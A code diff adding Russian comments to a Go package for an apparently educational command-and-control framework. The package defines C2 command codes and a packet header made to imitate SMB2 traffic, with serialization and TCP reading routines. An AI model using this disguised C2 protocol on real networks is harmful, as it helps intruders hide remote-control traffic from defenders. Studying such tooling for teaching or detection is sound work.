@@ -1,3 +1,6 @@
+// Package shared содержит общие для всех компонентов системы (терминал,
+// C2-сервер, клиент) определения: формат псевдо-SMB пакета, функции
+// шифрования/дешифрования и константы протокола.
 package shared
 
 import (
@@ -8,51 +11,70 @@ import (
 	"net"
 )
 
+// Константы протокола обфускации и коды команд C2.
 const (
+	// SMB2ProtocolID — маркер, с которого начинается заголовок пакета.
+	// Имитирует реальный маркер SMB2-заголовка (\xfeSMB).
 	SMB2ProtocolID = "\xfeSMB"
+	// SMB2HeaderSize — фиксированный размер заголовка пакета в байтах.
 	SMB2HeaderSize = 64
 
-	CmdRegister    = 0x0000
-	CmdRegisterAck = 0x0001
-	CmdGetTask     = 0x0002
-	CmdTaskData    = 0x0003
-	CmdSendResult  = 0x0004
-	CmdResultAck   = 0x0005
+	// Коды команд, передаваемых между C2 и клиентом.
+	CmdRegister    = 0x0000 // Клиент -> C2: регистрация
+	CmdRegisterAck = 0x0001 // C2 -> Клиент: подтверждение регистрации
+	CmdGetTask     = 0x0002 // Клиент -> C2: запрос задачи
+	CmdTaskData    = 0x0003 // C2 -> Клиент: данные задачи (или пусто)
+	CmdSendResult  = 0x0004 // Клиент -> C2: отправка результата
+	CmdResultAck   = 0x0005 // C2 -> Клиент: подтверждение получения результата
 
+	// MaxPayloadSize — максимально допустимый размер полезной нагрузки
+	// (16 МБ). Используется для защиты от некорректных или вредоносных
+	// пакетов с завышенной длиной.
 	MaxPayloadSize = 16 * 1024 * 1024
 )
 
+// Packet описывает структуру пакета, передаваемого между C2 и клиентом.
+// Заголовок пакета имитирует SMB2-заголовок фиксированного размера (64 байта),
+// а поле Payload содержит зашифрованные данные.
 type Packet struct {
-	Command   uint16
-	Status    uint32
-	SessionID uint64
-	MessageID uint64
-	TreeID    uint32
-	Payload   []byte
+	Command   uint16 // Код команды (CmdRegister, CmdGetTask и т.д.)
+	Status    uint32 // Статус выполнения (зарезервировано)
+	SessionID uint64 // Идентификатор сессии
+	MessageID uint64 // Идентификатор сообщения
+	TreeID    uint32 // Идентификатор ресурса (в учебных целях используется как признак наличия задачи)
+	Payload   []byte // Полезная нагрузка (зашифрованная)
 }
 
+// Serialize собирает пакет в байтовый срез в формате, повторяющем
+// структуру SMB2-заголовка. Поля записываются в порядке LittleEndian.
+// После 64-байтового заголовка добавляется полезная нагрузка.
+// Возвращает готовый к отправке байтовый срез.
 func (p *Packet) Serialize() []byte {
 	buf := new(bytes.Buffer)
 
-	buf.WriteString(SMB2ProtocolID)
-	binary.Write(buf, binary.LittleEndian, uint16(SMB2HeaderSize))
-	binary.Write(buf, binary.LittleEndian, uint16(0))
-	binary.Write(buf, binary.LittleEndian, p.Status)
-	binary.Write(buf, binary.LittleEndian, p.Command)
-	binary.Write(buf, binary.LittleEndian, uint16(0))
-	binary.Write(buf, binary.LittleEndian, uint32(0))
-	binary.Write(buf, binary.LittleEndian, uint32(0))
-	binary.Write(buf, binary.LittleEndian, p.MessageID)
-	binary.Write(buf, binary.LittleEndian, uint32(len(p.Payload)))
-	binary.Write(buf, binary.LittleEndian, p.TreeID)
-	binary.Write(buf, binary.LittleEndian, p.SessionID)
-	buf.Write(make([]byte, 16))
+	buf.WriteString(SMB2ProtocolID)                                // 0..3   ProtocolId
+	binary.Write(buf, binary.LittleEndian, uint16(SMB2HeaderSize)) // 4..5   StructureSize
+	binary.Write(buf, binary.LittleEndian, uint16(0))              // 6..7   CreditCharge
+	binary.Write(buf, binary.LittleEndian, p.Status)               // 8..11  Status
+	binary.Write(buf, binary.LittleEndian, p.Command)              // 12..13 Command
+	binary.Write(buf, binary.LittleEndian, uint16(0))              // 14..15 CreditRequest
+	binary.Write(buf, binary.LittleEndian, uint32(0))              // 16..19 Flags
+	binary.Write(buf, binary.LittleEndian, uint32(0))              // 20..23 NextCommand
+	binary.Write(buf, binary.LittleEndian, p.MessageID)            // 24..31 MessageId
+	binary.Write(buf, binary.LittleEndian, uint32(len(p.Payload))) // 32..35 PayloadLength
+	binary.Write(buf, binary.LittleEndian, p.TreeID)               // 36..39 TreeId
+	binary.Write(buf, binary.LittleEndian, p.SessionID)            // 40..47 SessionId
+	buf.Write(make([]byte, 16))                                    // 48..63 Signature (пустые)
 
-	buf.Write(p.Payload)
+	buf.Write(p.Payload) // полезная нагрузка
 
 	return buf.Bytes()
 }
 
+// Deserialize разбирает байтовый срез в структуру Packet.
+// Проверяет минимальную длину и корректность маркера SMB2ProtocolID,
+// а также контролирует размер payload относительно MaxPayloadSize.
+// Возвращает указатель на Packet или ошибку при некорректных данных.
 func Deserialize(data []byte) (*Packet, error) {
 	if len(data) < SMB2HeaderSize {
 		return nil, errors.New("packet too short")
@@ -78,6 +100,12 @@ func Deserialize(data []byte) (*Packet, error) {
 	return p, nil
 }
 
+// ReadPacket полностью читает один пакет из TCP-соединения.
+// Сначала считывает 64 байта заголовка, извлекает из него длину payload,
+// затем дочитывает ровно столько байт полезной нагрузки через io.ReadFull.
+// Это гарантирует корректную работу при передаче больших пакетов,
+// когда данные не приходят одним сегментом.
+// Возвращает указатель на Packet или ошибку.
 func ReadPacket(conn net.Conn) (*Packet, error) {
 	header := make([]byte, SMB2HeaderSize)
 	if _, err := io.ReadFull(conn, header); err != nil {
